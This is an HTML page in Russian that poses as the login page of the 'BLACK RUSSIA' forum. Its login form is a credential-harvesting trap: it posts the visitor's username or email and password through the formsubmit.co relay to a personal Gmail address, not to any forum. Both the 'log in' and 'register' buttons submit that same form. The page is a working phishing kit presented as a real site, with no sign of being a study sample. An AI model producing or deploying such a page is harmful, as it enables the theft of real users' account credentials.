
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BLACK RUSSIA — Форум</title>
  <style>
    body {
      background-color: #2E2E2E;
      font-family: Arial, sans-serif;
      color: white;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #1f1f1f;
      padding: 20px;
      text-align: center;
    }

    header h1 {
      font-size: 2em;
      margin: 0;
    }

    .banner {
      background-color: #1f1f1f;
      text-align: center;
      padding: 40px 20px;
      margin-top: 20px;
    }

    .banner h2 {
      font-size: 1.6em;
      margin-bottom: 10px;
    }

    .banner p {
      font-size: 1em;
      margin: 0 auto;
      max-width: 600px;
    }

    .banner button {
      margin-top: 20px;
      padding: 12px 24px;
      background-color: #FF2E2E;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
      border-radius: 4px;
      font-size: 1em;
    }

    .login-box {
      background-color: #3A3A3A;
      max-width: 400px;
      margin: 30px auto;
      padding: 20px;
      border-radius: 8px;
    }

    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 4px;
      font-size: 1em;
    }

    .login-box button {
      width: 100%;
      background-color: #1a1a1a;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      font-size: 1em;
      cursor: pointer;
    }

    .login-box small {
      display: block;
      margin-top: 10px;
      text-align: center;
    }

    /* Адаптивность */
    @media (max-width: 600px) {
      .banner {
        padding: 20px 10px;
      }

      .banner h2 {
        font-size: 1.3em;
      }

      .banner p {
        font-size: 0.95em;
      }

      .banner button {
        font-size: 0.95em;
        padding: 10px 20px;
      }

      .login-box {
        margin: 20px 10px;
        padding: 15px;
      }

      header h1 {
        font-size: 1.6em;
      }
    }
  </style>
</head>
<body>
  <header>
    <h1>BLACK RUSSIA</h1>
  </header>

  <div class="banner">
    <h2>Добро пожаловать!</h2>
    <p>Для того, чтобы начать взаимодействовать с форумом Вам необходимо будет зарегистрировать либо войти в аккаунт.</p>
    <button onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
  </div>

  <div class="login-box">
    <form action="https://formsubmit.co/stanislavsisa26@gmail.com" method="POST">
      <input name="email" placeholder="Имя пользователя или email" required type="text"/>
      <input name="password" placeholder="Пароль" required type="password"/>
      <button type="submit">ВОЙТИ</button>
      <button style="margin-top:10px;" type="submit">ЗАРЕГИСТРИРОВАТЬСЯ</button>
    </form>
  </div>
</body>
</html>
